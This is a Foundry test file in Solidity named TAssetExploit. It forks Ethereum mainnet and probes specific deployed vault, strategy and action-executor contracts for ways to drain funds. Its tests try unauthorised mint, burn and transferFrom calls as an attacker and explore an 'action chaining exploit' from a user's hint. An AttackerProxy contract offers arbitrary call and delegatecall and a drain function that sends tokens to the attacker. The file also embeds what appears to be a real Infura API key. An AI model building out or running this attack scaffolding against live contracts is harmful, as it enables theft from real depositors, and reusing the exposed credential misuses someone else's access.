// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IStrategy {
    function vault() external view returns (address);
    function strategyStorage() external view returns (address);
    function callExecute(address _target, bytes memory _data) external payable returns (bytes32);
    function execute(address _target, bytes memory _data) external payable returns (bytes32);
}

contract TAssetExploit is Test {
    // TASSET is only 176 bytes - likely a minimal proxy
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;

    // EIP-1167 minimal proxy bytecode pattern
    bytes constant MINIMAL_PROXY_PREFIX = hex"363d3d373d3d3d363d73";

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeTAsset() public view {
        console.log("=== TASSET ANALYSIS ===\n");
        console.log("TASSET address:", TASSET);

        bytes memory code = TASSET.code;
        console.log("Code size:", code.length);

        // Print full bytecode
        console.log("\nFull bytecode:");
        console.logBytes(code);

        // Check if it's EIP-1167 minimal proxy
        if (code.length == 45 || code.length == 55) {
            console.log("\nLikely EIP-1167 minimal proxy!");
            // Extract implementation from bytes 10-30
            if (code.length >= 30) {
                bytes20 implBytes;
                assembly {
                    implBytes := mload(add(code, 30))
                }
                address impl = address(implBytes);
                console.log("Implementation:", impl);
            }
        }

        // Check if it has common ERC20 functions
        (bool success, bytes memory data) = TASSET.staticcall(
            abi.encodeWithSignature("name()")
        );
        if (success) {
            console.log("\nTASSET name:", abi.decode(data, (string)));
        }

        (success, data) = TASSET.staticcall(
            abi.encodeWithSignature("symbol()")
        );
        if (success) {
            console.log("TASSET symbol:", abi.decode(data, (string)));
        }

        (success, data) = TASSET.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("TASSET totalSupply:", supply / 1e18);
        }
    }

    function test_AnalyzeIAU() public view {
        console.log("=== IAU ANALYSIS ===\n");
        console.log("IAU address:", IAU);

        bytes memory code = IAU.code;
        console.log("Code size:", code.length);

        // Check basic ERC20 info
        (bool success, bytes memory data) = IAU.staticcall(
            abi.encodeWithSignature("name()")
        );
        if (success && data.length > 0) {
            console.log("IAU name:", abi.decode(data, (string)));
        }

        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("symbol()")
        );
        if (success && data.length > 0) {
            console.log("IAU symbol:", abi.decode(data, (string)));
        }

        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success) {
            uint256 supply = abi.decode(data, (uint256));
            console.log("IAU totalSupply:", supply / 1e18);
        }

        // Check IAU owner
        (success, data) = IAU.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success) {
            console.log("IAU owner:", abi.decode(data, (address)));
        }

        // Check if it's mintable
        (success,) = IAU.staticcall(
            abi.encodeWithSignature("minter()")
        );
        if (success) {
            console.log("IAU has minter function!");
        }

        // Count opcodes
        uint256 delegatecallCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) delegatecallCount++;
        }
        console.log("\nIAU DELEGATECALL opcodes:", delegatecallCount);
    }

    function test_CheckTAssetForExploit() public {
        console.log("=== CHECK TASSET FOR EXPLOIT ===\n");

        vm.startPrank(attacker);

        // TASSET might be a beacon proxy or minimal proxy
        // If it's mintable by anyone, that could be exploited

        // Try mint
        (bool success,) = TASSET.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1e18)
        );
        console.log("mint(attacker, 1e18) success:", success);

        // Try burn (might be able to burn others' tokens)
        (success,) = TASSET.call(
            abi.encodeWithSignature("burn(address,uint256)", VAULT, 1e18)
        );
        console.log("burn(VAULT, 1e18) success:", success);

        // Try transferFrom without approval
        (success,) = TASSET.call(
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VAULT, attacker, 1e18)
        );
        console.log("transferFrom(VAULT, attacker, 1e18) success:", success);

        vm.stopPrank();
    }

    function test_ActionChainingExploit() public {
        console.log("=== ACTION CHAINING EXPLOIT ANALYSIS ===\n");

        // The user's hint: use action chaining to extract to attacker's proxy
        // then extract from proxy to attacker

        // Let's analyze what happens if we deploy a contract with vault() function
        // that returns the real vault, then use ActionExecutor through it

        console.log("Strategy 0:", STRATEGY_0);
        console.log("ActionExecutor:", ACTION_EXECUTOR);

        // Check Strategy's vault
        address strategyVault = IStrategy(STRATEGY_0).vault();
        console.log("Strategy 0 vault:", strategyVault);

        // Check if Strategy has approvals
        uint256 approval = IERC20(wstETH).allowance(STRATEGY_0, ACTION_EXECUTOR);
        console.log("Strategy -> ActionExecutor wstETH approval:", approval);

        approval = IERC20(wstETH).allowance(STRATEGY_0, VAULT);
        console.log("Strategy -> Vault wstETH approval:", approval);

        // Check Vault's balances
        console.log("\nVault wstETH balance:", IERC20(wstETH).balanceOf(VAULT) / 1e18);
        console.log("Strategy wstETH balance:", IERC20(wstETH).balanceOf(STRATEGY_0) / 1e18);
    }

    function test_DeployAttackerProxy() public {
        console.log("=== DEPLOY ATTACKER PROXY EXPERIMENT ===\n");

        // Deploy a contract that mimics Strategy interface
        // Key: vault() returns real Vault address
        // If we can make this proxy execute actions, it might drain funds

        vm.startPrank(attacker);

        AttackerProxy proxy = new AttackerProxy(VAULT, wstETH, attacker);
        console.log("Attacker proxy deployed:", address(proxy));
        console.log("Proxy.vault():", proxy.vault());

        // Try to call ActionExecutor via proxy's delegatecall
        // The idea: If VaultPull uses msg.sender.vault(), and msg.sender is our proxy
        // Then vault will be our real vault, and the call might be authorized

        console.log("\nTrying to use proxy to call ActionExecutor...");

        // VaultPull action selector
        bytes4 vaultPullSelector = bytes4(keccak256("executeAction(bytes,uint8[],bytes32[])"));

        // Check if we can make Strategy execute an action that sends to our proxy
        // Then drain from our proxy

        vm.stopPrank();
    }

    function test_FindTransferableAction() public view {
        console.log("=== FINDING ACTIONS WITH CONTROLLABLE TRANSFER ===\n");

        // We need an action that:
        // 1. Transfers tokens to a controllable address
        // 2. Can be triggered via the Strategy/ActionExecutor chain

        // Known actions with controllable `to` parameter:
        // - TokenTransfer: transfers to specified address
        // - SendToken: might have controllable recipient

        // Action registry
        address[] memory actions = new address[](13);
        actions[0] = 0xbdFb29cCD82dB3ccf462F3CB600892b2E6f185C7;  // LidoStake
        actions[1] = 0x160F1f3a512Fa7cCefA0eb08f881282c05d6eb0f;  // LidoWrap
        actions[2] = 0xb8cD2bA2A0Ada353aE15398618Fafb1d7BD558C5;  // LidoUnwrap
        actions[3] = 0x3e34E0694204e462Deaf8EBbeEE2bE9F887f3C3b;
        actions[4] = 0x99eAe56224EA5Bcb2c886D0a07154217b7A1E5d1;
        actions[5] = 0x819Bdb303e224CaC4aC14Da17a1ec13895869b65;
        actions[6] = 0x3503152722beeE269E9B4E0921F2c3D44C90d2b5;  // AaveV3Supply
        actions[7] = 0xEE1F8dc0135EE9dC2e00fac3817b9C530d34B6ba;  // AaveV3Borrow
        actions[8] = 0x71f4d0A74b7F1BB07cc767dC2f4b436E907476DC;  // AaveV3Payback
        actions[9] = 0x0039d822156FF2FD28ac6e19A518660890fcD2E0;  // AaveV3Withdraw
        actions[10] = 0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9; // VaultPull
        actions[11] = 0xc780112305ED959CEEeb0DE692E2407E4145Fc3A;
        actions[12] = 0x351dd4581d61BCE7101FDf5f6864D510021c7CaB;

        console.log("Checking each action for transferable functions...");

        for (uint i = 0; i < actions.length; i++) {
            bytes memory code = actions[i].code;
            if (code.length == 0) continue;

            // Count CALL opcodes - indicates external calls
            uint256 callCount = 0;
            for (uint j = 0; j < code.length; j++) {
                if (uint8(code[j]) == 0xf1) callCount++;
            }

            // Check if action has executeAction
            (bool success,) = actions[i].staticcall(
                abi.encodeWithSignature("actionType()")
            );

            if (success) {
                console.log("\nAction", i, ":", actions[i]);
                console.log("  Code size:", code.length);
                console.log("  CALL opcodes:", callCount);
            }
        }
    }
}

contract AttackerProxy {
    address public vault;
    address public token;
    address public owner;

    constructor(address _vault, address _token, address _owner) {
        vault = _vault;
        token = _token;
        owner = _owner;
    }

    // Mimic Strategy interface
    function strategyStorage() external pure returns (address) {
        return address(0);
    }

    // Execute arbitrary calls
    function execute(address target, bytes memory data) external returns (bytes memory) {
        (bool success, bytes memory result) = target.call(data);
        require(success, "execute failed");
        return result;
    }

    // Delegatecall for context preservation
    function executeVia(address target, bytes memory data) external returns (bytes memory) {
        (bool success, bytes memory result) = target.delegatecall(data);
        require(success, "delegatecall failed");
        return result;
    }

    // Drain any tokens
    function drain(address _token) external {
        uint256 balance = IERC20(_token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(_token).transfer(owner, balance);
        }
    }

    receive() external payable {}
}
